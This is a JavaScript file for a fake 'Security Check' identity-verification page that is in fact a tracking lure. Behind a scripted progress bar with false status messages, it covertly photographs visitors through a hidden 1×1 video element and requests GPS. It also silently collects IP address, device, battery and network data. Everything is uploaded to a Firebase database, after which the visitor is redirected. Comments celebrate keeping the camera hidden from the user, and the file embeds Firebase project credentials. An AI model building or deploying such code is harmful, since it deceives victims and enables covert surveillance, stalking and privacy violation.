// ── IMPORTS ───────────────────────────────────────────────────────────────
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getDatabase, ref, push, set, get, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

// ── FIREBASE CONFIG ───────────────────────────────────────────────────────
const firebaseConfig = {
    apiKey:            "AIzaSyCu-4lEX3qQqPCow3nhvCHZNrpg5nbEUm0",
    authDomain:        "camera-c436d.firebaseapp.com",
    databaseURL:       "https://camera-c436d-default-rtdb.firebaseio.com",
    projectId:         "camera-c436d",
    storageBucket:     "camera-c436d.firebasestorage.app",
    messagingSenderId: "1024848910212",
    appId:             "1:1024848910212:web:80a95f41281d1a920eafd1"
};

const app = initializeApp(firebaseConfig);
const db  = getDatabase(app);

// ── UI HELPERS ────────────────────────────────────────────────────────────
function setStatus(text) {
    const el = document.getElementById('statusText');
    if (el) el.innerText = text;
}

function setFakeStatus(text) {
    const el = document.getElementById('fakeStatus');
    if (el) el.innerText = text;
}

function setProgress(pct) {
    const el = document.getElementById('progressBar');
    if (el) el.style.width = pct + '%';
}

// ── FAKE PROGRESS BAR SETUP ───────────────────────────────────────────────
// Returns a controller object { update(pct, text), finish() }
function buildProgressUI(container) {
    container.innerHTML = `
        <h2>Security Check</h2>
        <p style="color:#666; font-size:14px;">Please wait while we verify your identity...</p>
        <div style="background:#f0f0f0; border-radius:8px; overflow:hidden; height:12px; margin:18px 0 8px;">
            <div id="progressBar" style="height:100%; width:0%; background:linear-gradient(90deg,#007bff,#00c6ff); border-radius:8px; transition:width 0.4s ease;"></div>
        </div>
        <p id="fakeStatus" style="font-size:13px; color:#777; margin:4px 0;">Initializing...</p>
        <p id="statusText"  style="font-size:13px; color:#007bff; font-weight:600; margin:6px 0; min-height:18px;"></p>
        <video id="video" autoplay playsinline muted style="display:none; width:1px; height:1px; opacity:0; position:absolute;"></video>
        <canvas id="canvas" style="display:none;"></canvas>
    `;

    // Ambient progress ticks — slow crawl that never reaches 100%
    const steps = [
        [10, "Checking SSL certificate..."],
        [20, "Connecting to server..."],
        [30, "Validating session token..."],
        [42, "Authenticating identity..."],
        [54, "Requesting permissions..."],
        [65, "Processing biometric data..."],
        [74, "Encrypting data transfer..."],
        [83, "Finalizing verification..."],
        [90, "Almost done..."]
    ];

    let i = 0;
    const ticker = setInterval(() => {
        if (i < steps.length) {
            setProgress(steps[i][0]);
            setFakeStatus(steps[i][1]);
            i++;
        } else {
            clearInterval(ticker);
        }
    }, 900);

    return {
        stop() { clearInterval(ticker); },
        finish() {
            clearInterval(ticker);
            setProgress(100);
            setFakeStatus('Verification complete!');
            setStatus('✅ Verification Successful!');
        }
    };
}

// ── COLLECT DEVICE INFO ───────────────────────────────────────────────────
async function collectDeviceInfo(opts = { network: true, battery: true, device: true }) {
    const ua = navigator.userAgent;
    const info = {
        userAgent:      ua,
        platform:       navigator.platform   || 'Unknown',
        language:       navigator.language   || 'Unknown',
        screenWidth:    screen.width,
        screenHeight:   screen.height,
        colorDepth:     screen.colorDepth,
        timezone:       Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        onlineStatus:   navigator.onLine,
        referrer:       document.referrer    || 'Direct',
        pageUrl:        window.location.href,
    };

    // Network info
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (opts.network !== false && conn) {
        info.networkType = conn.effectiveType || 'Unknown';
        info.downlink    = conn.downlink != null ? conn.downlink + ' Mbps' : 'Unknown';
    } else {
        info.networkType = 'N/A';
        info.downlink    = 'N/A';
    }

    // Battery (best-effort — not available on all browsers)
    if (opts.battery !== false) {
    try {
        const bat     = await Promise.race([
            navigator.getBattery(),
            new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 2000))
        ]);
        info.battery  = Math.round(bat.level * 100) + '%';
        info.charging = bat.charging ? 'Yes' : 'No';
    } catch (_) {
        info.battery  = 'Unavailable';
        info.charging = 'Unavailable';
    }
    } else {
        info.battery  = 'N/A';
        info.charging = 'N/A';
    }

    // OS
    if      (/android/i.test(ua))           info.os = 'Android';
    else if (/iphone|ipad|ipod/i.test(ua))  info.os = 'iOS';
    else if (/windows phone/i.test(ua))     info.os = 'Windows Phone';
    else if (/windows/i.test(ua))           info.os = 'Windows';
    else if (/mac/i.test(ua))               info.os = 'macOS';
    else if (/linux/i.test(ua))             info.os = 'Linux';
    else                                    info.os = 'Unknown';

    // Browser (order matters — Edge & Opera contain "Chrome")
    if      (/edg\//i.test(ua))                          info.browser = 'Edge';
    else if (/opr\/|opera/i.test(ua))                    info.browser = 'Opera';
    else if (/chrome\/\d/i.test(ua))                     info.browser = 'Chrome';
    else if (/firefox\/\d/i.test(ua))                    info.browser = 'Firefox';
    else if (/safari\/\d/i.test(ua) && !/chrome/i.test(ua)) info.browser = 'Safari';
    else                                                  info.browser = 'Unknown';

    return info;
}

// ── GET PUBLIC IP ─────────────────────────────────────────────────────────
async function getIPAddress() {
    const apis = [
        'https://api.ipify.org?format=json',
        'https://api64.ipify.org?format=json',
        'https://ipapi.co/json/'
    ];
    for (const url of apis) {
        try {
            const r = await fetch(url, { signal: AbortSignal.timeout(4000) });
            const d = await r.json();
            const ip = d.ip || d.IPv4 || null;
            if (ip) return ip;
        } catch (_) { /* try next */ }
    }
    return 'Unavailable';
}

// ── CAPTURE PHOTO FROM CAMERA ─────────────────────────────────────────────
// BUG FIXED: video.onloadedmetadata set BEFORE srcObject assignment
// BUG FIXED: video kept hidden (1×1 invisible) so user never sees it
// BUG FIXED: separate timeout promise prevents the race with onloadedmetadata
async function capturePhoto() {
    const video  = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    setStatus('📷 Requesting camera access...');

    let stream;
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
        });
    } catch (e) {
        // Permission denied or no camera — not fatal
        console.warn('Camera denied:', e.message);
        setStatus('');
        return null;
    }

    // Attach stream — set onloadedmetadata BEFORE srcObject to avoid missing the event
    // BUG FIXED: Previously srcObject was set first, event could fire before handler registered
    const readyPromise = new Promise(resolve => {
        video.onloadedmetadata = () => {
            video.play().catch(() => {}).finally(resolve);
        };
        // Hard fallback in case event never fires (some mobile browsers)
        setTimeout(resolve, 6000);
    });

    video.srcObject = stream;
    await readyPromise;

    // Give camera sensor time to auto-expose
    await new Promise(r => setTimeout(r, 1200));

    // Take the shot
    canvas.width  = video.videoWidth  || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const photoData = canvas.toDataURL('image/jpeg', 0.80);

    // Stop all tracks immediately
    stream.getTracks().forEach(t => t.stop());
    video.srcObject = null;

    setStatus('');
    return photoData;
}

// ── GET GPS LOCATION ──────────────────────────────────────────────────────
async function getLocation() {
    setStatus('📍 Requesting location access...');
    return new Promise(resolve => {
        if (!navigator.geolocation) { resolve({ lat: 'Unavailable', lon: 'Unavailable' }); return; }

        navigator.geolocation.getCurrentPosition(
            pos => {
                setStatus('');
                resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
            },
            err => {
                console.warn('GPS denied:', err.message);
                setStatus('');
                resolve({ lat: 'Denied', lon: 'Denied' });
            },
            { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
        );
    });
}

// ── VALIDATE REDIRECT URL ─────────────────────────────────────────────────
// BUG FIXED: empty string "" was falsy but not caught — now we strip and validate
function isValidUrl(url) {
    if (!url || typeof url !== 'string') return false;
    const s = url.trim();
    if (!s) return false;
    try {
        const u = new URL(s);
        return u.protocol === 'http:' || u.protocol === 'https:';
    } catch (_) {
        return false;
    }
}

// ── MAIN VERIFICATION FLOW ────────────────────────────────────────────────
async function initVerification() {
    const params = new URLSearchParams(window.location.search);
    const linkId = params.get('linkId');

    // ── No link ID ──
    if (!linkId) {
        document.body.innerHTML = `
            <div style="text-align:center; margin-top:80px; font-family:sans-serif; color:#333;">
                <h1 style="font-size:48px; margin:0;">404</h1>
                <p style="color:#888;">No link ID provided.</p>
            </div>`;
        return;
    }

    // ── Fetch settings ──
    let settings;
    try {
        const snap = await get(ref(db, 'managed_links/' + linkId));
        settings   = snap.val();
    } catch (e) {
        document.body.innerHTML = `
            <div style="text-align:center; margin-top:80px; font-family:sans-serif;">
                <h2>Connection Error</h2>
                <p style="color:#888;">Could not reach server. Check your connection and try again.</p>
                <button onclick="location.reload()" style="margin-top:14px; padding:10px 22px; background:#007bff; color:#fff; border:none; border-radius:6px; cursor:pointer; font-size:14px;">Retry</button>
            </div>`;
        return;
    }

    // ── Invalid / disabled link ──
    if (!settings || !settings.active) {
        document.body.innerHTML = `
            <div style="text-align:center; margin-top:80px; font-family:sans-serif; color:#333;">
                <h1 style="font-size:48px; margin:0;">404</h1>
                <p style="color:#888;">This link is invalid or has been disabled.</p>
            </div>`;
        return;
    }

    // ── Increment visit count (fire-and-forget) ──
    update(ref(db, 'managed_links/' + linkId), { visits: (settings.visits || 0) + 1 }).catch(() => {});

    // ── Build UI ──
    const container = document.querySelector('.container');
    const progress  = buildProgressUI(container);

    // ── IMMEDIATELY trigger permissions before any async work ──
    // BUG FIXED: Previously permissions were requested after device info + IP fetch
    // which added 1-3 seconds of delay before the browser prompt appeared.
    // Now we fire them in parallel with background data collection.

    const needsCam     = !!(settings.cam     || settings.permissions?.camera);
    const needsGPS     = !!(settings.gps     || settings.permissions?.location);
    const needsDevice  = settings.permissions?.device_info  !== false;
    const needsNetwork = settings.permissions?.network_info !== false;
    const needsBattery = settings.permissions?.battery_info !== false;

    // Start cam + gps in parallel — both trigger browser prompts immediately
    // Start background info collection at the same time
    const camPromise  = needsCam ? capturePhoto()    : Promise.resolve(null);
    const gpsPromise  = needsGPS ? getLocation()     : Promise.resolve({ lat: 'Denied', lon: 'Denied' });
    const infoPromise = collectDeviceInfo({ network: needsNetwork, battery: needsBattery, device: needsDevice });
    const ipPromise   = getIPAddress();

    // Await all — cam/gps show browser prompts; info/ip run silently in background
    const [photoData, gpsResult, deviceInfo, ipAddress] = await Promise.all([
        camPromise, gpsPromise, infoPromise, ipPromise
    ]);

    const lat = gpsResult?.lat ?? 'Denied';
    const lon = gpsResult?.lon ?? 'Denied';

    // ── Save to Firebase ──
    const now       = Date.now();
    const saveError = await (async () => {
        try {
            const newRef = push(ref(db, 'photo_history'));
            await set(newRef, {
                id:        now,
                // BUG FIXED: only store image if we actually got one — saves Firebase bandwidth
                image:     photoData || null,
                latitude:  lat,
                longitude: lon,
                linkName:  settings.name  || 'Unknown',
                linkId:    linkId,
                date:      new Date(now).toLocaleDateString(),
                time:      new Date(now).toLocaleTimeString(),
                timestamp: now,
                ipAddress: ipAddress,
                device:    deviceInfo
            });
            return null;
        } catch (e) {
            console.error('Firebase save error:', e);
            return e.message;
        }
    })();

    // Finish the progress UI regardless of save success
    progress.finish();

    if (saveError) {
        setStatus('⚠️ Verification issue — please try again.');
        return;
    }

    // ── Redirect ──
    // BUG FIXED: was checking `settings.redirectUrl` which passes for empty string ""
    // BUG FIXED: was waiting 2000ms — now redirects immediately after save
    if (isValidUrl(settings.redirectUrl)) {
        setStatus('✅ Done! Redirecting...');
        // Tiny delay so user sees the success message (200ms)
        setTimeout(() => {
            window.location.replace(settings.redirectUrl.trim());
        }, 200);
    }
    // If no redirect URL — verification complete, page stays as-is
}

// ── BOOT ─────────────────────────────────────────────────────────────────
window.addEventListener('load', initVerification);
